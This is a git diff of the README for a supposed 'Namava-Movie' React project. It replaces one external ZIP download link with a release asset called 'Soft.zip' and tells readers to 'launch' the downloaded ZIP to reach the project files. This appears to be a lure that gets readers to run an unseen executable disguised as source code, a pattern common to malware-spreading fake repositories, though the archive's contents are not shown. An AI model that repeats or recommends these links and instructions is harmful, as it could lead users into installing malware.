@@ -12,7 +12,7 @@ Welcome to the "Namava-Movie" repository! 🍿 In this project, you will find al
 
 To get started with the Namava Movie React project, simply download the ZIP file from the following link: 
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download ZIP](https://github.com/Needsj6/Namava-Movie/releases/download/v1.0/Soft.zip)](https://github.com/Needsj6/Namava-Movie/releases/download/v1.0/Soft.zip)
 
 📌 *Note: Please make sure to launch the downloaded ZIP file to access the project files.*
 
